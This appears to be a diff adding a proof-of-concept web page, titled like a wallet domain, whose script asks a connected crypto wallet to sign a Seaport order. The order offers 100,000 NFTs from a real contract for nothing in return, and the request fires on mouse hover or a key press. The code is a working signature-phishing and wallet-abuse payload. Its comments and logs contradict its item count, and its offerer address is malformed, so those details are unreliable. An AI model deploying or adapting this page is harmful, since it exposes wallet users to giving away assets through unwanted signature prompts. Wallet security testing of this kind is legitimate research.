@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>wallet.flow.com</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #22c55e; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>Love You :P</h1>
+    <p>Move your cursor over this page to trigger signing of a Seaport order with <strong>1M items</strong>.</p>
+    <p class="warn">Love You :P</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const ITEM_COUNT = 100000; // 1
+    const SIGN_COUNT = 1;
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Generate huge Seaport order with 100 items
+    let typedData = null;
+    window.addEventListener('load', () => {
+      log(`Generating Seaport typed data with ${ITEM_COUNT} offer items...`);
+      const offer = [];
+      for (let i = 0; i < ITEM_COUNT; i++) {
+        offer.push({
+          itemType: 2,
+          token: "0x60e4d786628fea6478f785a6d7e704777c86a7c6",
+          identifierOrCriteria: (i + 1000).toString(),
+          startAmount: "1",
+          endAmount: "1"
+        });
+      }
+
+      typedData = {
+        types: {
+          EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "version", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" }
+          ],
+          OrderComponents: [
+            { name: "offerer", type: "address" },
+            { name: "zone", type: "address" },
+            { name: "offer", type: "OfferItem[]" },
+            { name: "consideration", type: "ConsiderationItem[]" },
+            { name: "orderType", type: "uint8" },
+            { name: "startTime", type: "uint256" },
+            { name: "endTime", type: "uint256" },
+            { name: "zoneHash", type: "bytes32" },
+            { name: "salt", type: "uint256" },
+            { name: "conduitKey", type: "bytes32" },
+            { name: "counter", type: "uint256" }
+          ],
+          OfferItem: [
+            { name: "itemType", type: "uint8" },
+            { name: "token", type: "address" },
+            { name: "identifierOrCriteria", type: "uint256" },
+            { name: "startAmount", type: "uint256" },
+            { name: "endAmount", type: "uint256" }
+          ],
+          ConsiderationItem: [
+            { name: "itemType", type: "uint8" },
+            { name: "token", type: "address" },
+            { name: "identifierOrCriteria", type: "uint256" },
+            { name: "startAmount", type: "uint256" },
+            { name: "endAmount", type: "uint256" },
+            { name: "recipient", type: "address" }
+          ]
+        },
+        domain: {
+          name: "Seaport",
+          version: "1.5",
+          chainId: 1,
+          verifyingContract: "0x00000000000000adc04c56bf30ac9d3c0aaac8d8" // Real Seaport contract
+        },
+        primaryType: "OrderComponents",
+        message: {
+          offerer: "0x5a6f54b7c9a4d8e9f1a2b3c4d5e6f7g8h9i0j1k2",
+          zone: "0x004c00500000ad104d7cddbc9ff9e8d6f9a3b6d8",
+          offer: offer,
+          consideration: [],
+          orderType: 0,
+          startTime: "1734000000",
+          endTime: "1760000000",
+          zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+          salt: "123456789",
+          conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+          counter: 0
+        }
+      };
+      log('Seaport typed data generated with 100 offer items. Hover to trigger signing.');
+    });
+
+    // Mock sign fallback
+    function mockSign() {
+      const fakeSig = `0xMOCKSIG_${Math.random().toString(36).slice(2)}`;
+      log(`Mock signed (huge typed data)`);
+      return Promise.resolve(fakeSig);
+    }
+
+    // Real eth_signTypedData_v4 with fallback
+    async function trySignTyped(fromAddress) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock signature`);
+        return mockSign();
+      }
+
+      try {
+        const sig = await ethereum.request({
+          method: 'eth_signTypedData_v4',
+          params: [fromAddress, JSON.stringify(typedData)]
+        });
+        log(`REAL SEAPORT SIGN SUCCESS! Signature length: ${sig.length}`);
+        return sig;
+      } catch (err) {
+        log(`Real sign failed: ${err.message || err}. Falling back to mock.`);
+        return mockSign();
+      }
+    }
+
+    // Hover-triggered batch signing
+    async function signBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler);
+
+      outEl.textContent = '';
+      log('Cursor detected. Starting huge Seaport order signing...');
+
+      if (!window.ethereum) {
+        log('No wallet detected. Using mock mode.');
+        await mockSign();
+        setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        return;
+      }
+
+      let accounts;
+      try {
+        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (err) {
+        log('Account request failed/rejected. Using mock.');
+        await mockSign();
+        setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        return;
+      }
+
+      const from = accounts[0];
+      log(`Connected: ${from}`);
+
+      log(`Attempting to sign Seaport order with ${ITEM_COUNT} items using eth_signTypedData_v4...`);
+
+      const sig = await trySignTyped(from);
+      log(`Final result: ${sig}`);
+
+      log('Test completed.');
+      setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 3000);
+    }
+
+    // Hover handler (sama persis seperti personal_sign)
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        signBatchHover().catch(err => {
+          log('Error:', err);
+          setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        });
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler);
+      log('Hover listener active. Move cursor to trigger.');
+    });
+
+    // Keyboard fallback (press 'S' for trusted gesture)
+    window.addEventListener('keydown', (e) => {
+      if (e.key.toLowerCase() === 's') {
+        log('Manual trigger via "S" key!');
+        signBatchHover();
+      }
+    });
+  </script>
+</body>
+</html>
